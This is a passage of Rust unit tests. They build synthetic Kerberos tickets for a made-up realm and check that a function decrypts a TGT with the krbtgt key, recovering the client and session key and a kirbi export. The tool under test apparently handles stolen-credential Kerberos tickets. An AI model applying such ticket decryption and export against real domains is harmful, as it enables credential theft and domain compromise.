                t_int_ctx(0xA0, 5),
                tlv(0xA1, &general_string("CORP.LOCAL")),
                tlv(
                    0xA2,
                    &principal_name_der(2, &["krbtgt".to_string(), "CORP.LOCAL".to_string()]),
                ),
                ticket_cipher_blob,
            ]
            .concat(),
        );
        let ticket_blob = tlv(0x61, &ticket_seq);

        let ticket = parse_ticket(&ticket_blob).expect("ticket parses");
        assert_eq!(ticket.sname.first().map(|s| s.as_str()), Some("krbtgt"));

        let complete = decrypt_ticket(&ticket, &krbtgt_key).expect("decrypts with correct key");
        assert_eq!(complete.client_realm, "CORP.LOCAL");
        assert_eq!(complete.client_name, vec!["alice"]);
        assert!(complete.is_tgt);
        assert_eq!(complete.session_key_hex.len(), 64);
        assert!(find(&complete.kirbi, &session_key).is_some());
        assert!(find(&complete.kirbi, b"alice").is_some());
    }

    #[test]
    fn decrypt_ticket_rejects_wrong_key() {
        let krbtgt_key: Vec<u8> = (0..32).map(|_| rand::random::<u8>()).collect();
        let wrong_key: Vec<u8> = (0..32).map(|_| rand::random::<u8>()).collect();
        let session_key: Vec<u8> = (0..32).map(|_| rand::random::<u8>()).collect();

        let enc_part = build_test_enc_ticket_part(&session_key);
        let cipher = kerberos_crypto::new_kerberos_cipher(18).unwrap();
        let encrypted = cipher.encrypt(&krbtgt_key, 2, &enc_part);
        let ticket_cipher_blob = tlv(
            0xA3,
            &tlv(
                0x30,
                &[
                    t_int_ctx(0xA0, 18),
                    t_int_ctx(0xA1, 2),
                    tlv(0xA2, &octets_der(&encrypted)),
                ]
                .concat(),
            ),
        );
        let ticket_seq = tlv(
            0x30,
            &[
                t_int_ctx(0xA0, 5),
                tlv(0xA1, &general_string("CORP.LOCAL")),
                tlv(
                    0xA2,
                    &principal_name_der(2, &["krbtgt".to_string(), "CORP.LOCAL".to_string()]),
                ),
                ticket_cipher_blob,
            ]
            .concat(),
        );
        let ticket_blob = tlv(0x61, &ticket_seq);
        let ticket = parse_ticket(&ticket_blob).unwrap();

        assert!(decrypt_ticket(&ticket, &wrong_key).is_none());
    }
}
